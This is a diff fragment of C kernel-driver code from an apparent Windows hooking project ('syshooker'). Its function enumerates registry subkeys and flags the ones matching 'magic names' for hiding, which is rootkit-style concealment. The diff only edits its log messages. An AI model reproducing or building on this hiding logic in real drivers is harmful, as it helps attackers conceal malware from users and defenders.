@@ -283,14 +283,14 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
     // required buffer size
     status = ZwQueryKey(KeyHandle, KeyFullInformation, NULL, 0, &resultLength);
     if (status != STATUS_BUFFER_TOO_SMALL) {
-        kprintf("[-] RegistryKeyHideInformation: Should not have happened, ZwQueryKey status: %d.\n", status);
+       // kprintf("[-] syshooker: RegistryKeyHideInformation: ZwQueryKey unknown status: %d.\n", status);
         return status;
     }
 
     // key information malloc
     keyInfo = (PKEY_FULL_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
     if (!keyInfo) {
-        kprintf("[-] RegistryKeyHideInformation: Failed to allocate keyInfo buffer.\n");
+       // kprintf("[-] syshooker: RegistryKeyHideInformation: Failed to allocate keyInfo buffer.\n");
         return STATUS_INSUFFICIENT_RESOURCES;
     }
 
@@ -298,7 +298,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
     status = ZwQueryKey(KeyHandle, KeyFullInformation, keyInfo, resultLength, &resultLength);
     if (!NT_SUCCESS(status)) {
         ExFreePool(keyInfo);
-        kprintf("[-] RegistryKeyHideInformation: ZwQueryKey call failed.\n");
+        //kprintf("[-] syshooker: RegistryKeyHideInformation: ZwQueryKey call unsuccessful.\n");
         return status;
     }
 
@@ -314,7 +314,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
     ULONG KeyIndex = 0;
     while (1) {
         if (*OkSubkeyIndexesCount > SubKeysCount || KeyIndex > SubKeysCount) {
-            kprintf("[-] RegistryKeyHideInformation: Index out of bound (%d %d %d). Should not have happened.\n", KeyIndex, *OkSubkeyIndexesCount, SubKeysCount);
+            kprintf("[-] syshooker: RegistryKeyHideInformation: Index out of bound (%d %d %d).\n", KeyIndex, *OkSubkeyIndexesCount, SubKeysCount);
             return STATUS_FAIL_CHECK;
         }
 
@@ -324,13 +324,13 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
             break;
         }
         else if (!NT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) { // we want to see STATUS_BUFFER_TOO_SMALL
-            kprintf("[-] RegistryKeyHideInformation: ZwEnumerateKey call failed %x.\n", status);
+            // kprintf("[-] RegistryKeyHideInformation: ZwEnumerateKey call unsuccessful %x.\n", status);
             return status;
         }
 
         subKeyInfo = (PKEY_BASIC_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
         if (!subKeyInfo) {
-            kprintf("[-] RegistryKeyHideInformation: Failed to allocate subKeyInfo buffer.\n");
+            // kprintf("[-] syshooker: RegistryKeyHideInformation: Failed to allocate subKeyInfo buffer.\n");
             return STATUS_INSUFFICIENT_RESOURCES;
         }
 
@@ -346,7 +346,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
             }
 
             if (matchMagicNames(SubKeyNameBuffer, (Target)TARGET_REGISTRY)) {
-                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
+                kprintf("[+] syshooker: RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
                 *HideSubkeyIndexesCount += 1;
             }
             else {
@@ -355,7 +355,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
             }
         }
         else {
-            kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", KeyIndex);
+            kprintf("[-] syshooker: RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d).\n", KeyIndex);
             ExFreePool(subKeyInfo);
             return status;
         }
